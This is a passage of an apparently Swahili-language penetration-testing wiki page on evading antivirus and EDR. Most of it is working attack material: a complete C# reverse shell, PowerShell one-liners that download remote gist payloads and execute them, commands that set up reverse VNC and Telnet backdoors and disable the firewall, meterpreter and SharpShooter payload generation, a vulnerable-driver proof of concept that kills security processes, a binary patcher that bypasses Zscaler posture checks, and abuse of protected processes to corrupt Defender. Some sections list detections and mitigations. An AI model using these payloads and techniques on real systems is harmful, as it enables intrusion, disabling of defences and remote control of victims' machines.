> Ikiwa unataka kusoma zaidi kuhusu C# Assembly loading, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kuendesha code ya uharibifu kwa kutumia lugha nyingine kwa kumruhusu mashine iliyodhulumiwa kupata **interpreter environment iliyowekwa kwenye Attacker Controlled SMB share**.

Kwa kuruhusu upatikanaji wa Interpreter Binaries na environment kwenye SMB share unaweza **kuendesha code yoyote katika lugha hizi ndani ya memory** ya mashine iliyodhulumiwa.

Repo inasema: Defender bado inaskana scripts lakini kwa kutumia Go, Java, PHP n.k tuna **uwezo zaidi wa kupitisha signatures za static**. Majaribio kwa kutumia random un-obfuscated reverse shell scripts katika lugha hizi yamefanikiwa.

## TokenStomping

Token stomping ni mbinu inayomruhusu mshambuliaji **kudanganya access token au bidhaa ya usalama kama EDR au AV**, kumruhusu kupunguza haki zake ili mchakato usife lakini usiwe na ruhusa za kukagua shughuli zenye madhara.

Kuzuia hili Windows inaweza **kuzuia mchakato wa nje** kupata handles juu ya tokens za mchakato za usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kufunga Chrome Remote Desktop kwenye PC ya mwathiri na kisha kuitumia kumchukua na kudumisha persistence:
1. Download kutoka https://remotedesktop.google.com/, bonyeza "Set up via SSH", kisha bonyeza faili la MSI kwa Windows kupakua MSI file.
2. Endesha installer kimya kwenye mashine ya mwathiri (inahitaji admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na bonyeza next. Wizard kisha itakuuliza ku-authorize; bonyeza kitufe cha Authorize ili kuendelea.
4. Endesha parameter iliyotolewa kwa mabadiliko machache: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Kumbuka param ya pin ambayo inaruhusu kuweka pin bila kutumia GUI).

## Advanced Evasion

Evasion ni mada ngumu sana, mara nyingi unalazimika kuzingatia vyanzo vingi vya telemetry katika mfumo mmoja tu, kwa hivyo ni karibu haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yenye umri/uttekelezaji wa juu.

Kila mazingira unayowahi kukabiliana nayo yata kuwa na nguvu na udhaifu wake mwenyewe.

Ninakuhimiza sana utaangalie hotuba hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata ufahamu wa mbinu za Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hii pia ni hotuba nyingine nzuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo itatoa sehemu za binary moja baada ya nyingine mpaka itagundua ni sehemu gani Defender inaiona kuwa zenye uhalifu na kuigawanya kwako.\
Zana nyingine inayofanya kitu kama hicho ni [**avred**](https://github.com/dobin/avred) yenye huduma ya wavuti katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Mpaka Windows10, Windows zote zilikuja na **Telnet server** ambayo unaweza kuiweka (kama administrator) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fanya **ianze** wakati mfumo unapowashwa na **iendeshe** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha telnet port** (stealth) na zimisha firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka downloads za bin, sio setup)

**ON THE HOST**: Endesha _**winvnc.exe**_ na sanidi server:

- Washa chaguo _Disable TrayIcon_
- Weka nenosiri katika _VNC Password_
- Weka nenosiri katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili **mpya** iliyoundwa _**UltraVNC.ini**_ ndani ya **victim**

#### **Reverse connection**

The **attacker** anapaswa **endesha ndani** ya **host** yake binary `vncviewer.exe -listen 5900` ili itakuwa **tayari** kukamata reverse **VNC connection**. Kisha, ndani ya **victim**: Anza daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kudumisha stealth lazima usifanye mambo kadhaa

- Usianzishe `winvnc` ikiwa tayari inafanya kazi au utasababisha [popup](https://i.imgur.com/1SROTTl.png). angalia ikiwa inaendesha na `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` katika directory hiyo hiyo au itasababisha [the config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usitumie `winvnc -h` kwa help au utasababisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anza lister** kwa `msfconsole -r file.rc` na **endesha** **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mlinzi wa sasa atakata mchakato kwa haraka sana.**

### Kuunda reverse shell yetu mwenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### C# Revershell ya kwanza

Ikompili kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using mkusanyaji
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Kupakua na kutekeleza kiotomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya obfuscators za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuondoa AV/EDR kutoka Kernel Space

Storm-2603 ilitumia utility ndogo ya console inayojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kuachia ransomware. Zana hiyo inaleta **driver yake dhaifu lakini *signed*** na kuitumia vibaya kutoa operesheni za kernel zenye vibali ambazo hata huduma za AV za Protected-Process-Light (PPL) hazina uwezo wa kuzizuia.

Mambo muhimu kuchukuliwa
1. **Signed driver**: Faili iliyowekwa kwenye disk ni `ServiceMouse.sys`, lakini binary ni driver halali aliyesainiwa `AToolsKrnl64.sys` kutoka Antiy Labs’ “System In-Depth Analysis Toolkit”. Kwa sababu driver ina saini halali ya Microsoft, inaapakuliwa hata wakati Driver-Signature-Enforcement (DSE) imewezeshwa.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza unasajili driver kama **kernel service** na wa pili unaianzisha ili `\\.\ServiceMouse` iweze kupatikana kutoka user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Uwezo                              |
|-----------:|------------------------------------|
| `0x99000050` | Kuua mchakato wowote kwa PID (kutumika kuua huduma za Defender/EDR) |
| `0x990000D0` | Kufuta faili yoyote kwenye disk |
| `0x990001D0` | Kuondoa driver na kuondoa service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD hupita kabisa ulinzi wa user-mode; msimbo unaotekelezwa kwenye kernel unaweza kufungua mchakato *protected*, kuwaua, au kufanyia vitu vya kernel uharibifu bila kuzingatia PPL/PP, ELAM au vipengele vingine vya hardening.

Detection / Mitigation
•  Wezesha orodha ya kuziba madriver dhaifu ya Microsoft (`HVCI`, `Smart App Control`) ili Windows ikatae kuipakia `AToolsKrnl64.sys`.
•  Fuatilia uundaji wa *kernel* services mpya na toa tahadhari wakati driver inapakiwa kutoka kwenye directory inayoweza kuandikwa na kila mtu au haipo kwenye allow-list.
•  Tazama handles za user-mode kwa custom device objects ikifuatiwa na simu za kushukiwa za `DeviceIoControl`.

### Kupitisha Ukaguzi wa Posture wa Zscaler Client Connector kupitia Patch ya Binary kwenye Disk

Zscaler’s **Client Connector** inatekeleza sheria za device-posture kwa ndani kwenye mteja na inategemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Uamuzi mbaya wa muundo uliofanywa mara mbili unafanya bypass kamili kuwa inawezekana:

1. Tathmini ya posture hufanyika **kabisa upande wa mteja** (boolean inatumwa kwa server).
2. Internal RPC endpoints zinathibitisha tu kwamba executable inayounganisha ime **signed by Zscaler** (kupitia `WinVerifyTrust`).

Kwa **kufanya patch kwa binaries nne zilizowekwa sahihi kwenye disk** njia zote mbili zinaweza kuondolewa:

| Binary | Original logic patched | Result |
|--------|------------------------|--------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Inarudi `1` kila wakati hivyo kila ukaguzi unaonekana umezingatia |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ mchakato wowote (hata usiosainiwa) anaweza kujiunga na RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Imebadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Imefupishwa (short-circuited) |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili za awali na kuwasha upya service stack:

* **Zote** ukaguzi wa posture unaonyesha **kijani/kuzingatia**.
* Binaries zisizotiwa saini au zilizorekebishwa zinaweza kufungua named-pipe RPC endpoints (mfano `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyoharibiwa inapata upatikanaji usiozuiliwa kwenye internal network iliyoainishwa na sera za Zscaler.

Somo hili la kesi linaonyesha jinsi maamuzi ya kuaminika upande wa mteja na ukaguzi rahisi wa saini yanavyoweza kushindwa kwa patches za byte chache.

## Kutumia vibaya Protected Process Light (PPL) Ili Kudhuru AV/EDR kwa LOLBINs

Protected Process Light (PPL) inatekeleza hierarchy ya signer/level ili mchakato uliolindwa wa kiwango sawa au cha juu tu uweze kuingilia wengine. Kivyovyote, kama unaweza kuanzisha kwa halali binary ienye PPL na kudhibiti argument zake, unaweza kubadilisha kazi zisizo hatari (kwa mfano, logging) kuwa primitive ndogo ya kuandika iliyo salimishwa na PPL dhidi ya saraka zilizo salimishwa zinazotumika na AV/EDR.

Nini kinachofanya mchakato uendeshe kama PPL
- EXE lengwa (na DLLs zozote zilizopakiwa) lazima zisainwe na EKU inayokubali PPL.
- Mchakato lazima uundwe kwa CreateProcess ukitumia flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Kiwango cha ulinzi kinachofaa lazima kitaombiwe kinacholingana na signer wa binary (kwa mfano, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa anti-malware signers, `PROTECTION_LEVEL_WINDOWS` kwa Windows signers). Viwango visivyofaa vitashindwa wakati wa uundaji.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Mfano wa matumizi:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- Orodhesha short names: `dir /x` katika kila parent directory.
- Tengeneza short path kwenye cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Anzisha the PPL-capable LOLBIN (ClipUp) na `CREATE_PROTECTED_PROCESS` kwa kutumia launcher (mfano: CreateProcessAsPPL).
2) Pasa ClipUp log-path argument ili kulazimisha file creation ndani ya protected AV directory (mfano: Defender Platform). Tumia 8.3 short names ikiwa inahitajika.
3) Ikiwa target binary kwa kawaida iko wazi/imefungwa na AV wakati inakimbia (mfano: MsMpEng.exe), panga the write wakati wa boot kabla AV inaanza kwa kuinstall auto-start service inayokimbia mapema kwa uhakika. Thibitisha boot ordering na Process Monitor (boot logging).
4) Baada ya reboot, the PPL-backed write inatokea kabla AV itakapo lock binaries zake, ikiharibu the target file na kuzuia startup.

Mfano wa invocation (paths zimefichwa/zimefupishwa kwa usalama):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Huwezi kudhibiti yaliyomo ambayo ClipUp inaandika zaidi ya mahali pa kuweka; primitive inafaa zaidi kwa uharibifu kuliko kwa kuingiza maudhui kwa usahihi.
- Inahitaji local admin/SYSTEM ili kusanidi/kuanza service na dirisha la reboot.
- Muda ni muhimu: lengo halipaswi kuwa wazi; utekelezaji wakati wa boot huzuia kufungwa kwa faili.

Detections
- Uundaji wa mchakato wa `ClipUp.exe` kwa hoja zisizo za kawaida, hasa ukiwa umeparentwa na launchers zisizo za kawaida, karibu na boot.
- New services zilizowekwa kuanza-auto-start binaries zenye mashaka na kuanza mara kwa mara kabla ya Defender/AV. Chunguza service creation/modification kabla ya Defender startup failures.
- File integrity monitoring kwenye Defender binaries/Platform directories; uundaji/marekebisho ya faili yasiyotegemewa na michakato yenye protected-process flags.
- ETW/EDR telemetry: angalia michakato iliyoundwa kwa `CREATE_PROTECTED_PROCESS` na matumizi ya kiwango cha PPL isiyo ya kawaida na binaries zisizo za AV.

Mitigations
- WDAC/Code Integrity: zuia ni binaries zipi zilizosainiwa zinaweza kuendesha kama PPL na chini ya wazazi gani; zuia ClipUp invocation nje ya muktadha halali.
- Service hygiene: zuia creation/modification ya auto-start services na fuatilia start-order manipulation.
- Hakikisha Defender tamper protection na early-launch protections ziko enabled; chunguza startup errors zinazoashiria binary corruption.
- Fikiria kuzima 8.3 short-name generation kwenye volumes zinazohifadhi security tooling ikiwa inafaa kwa mazingira yako (test thoroughly).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Marejeleo

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
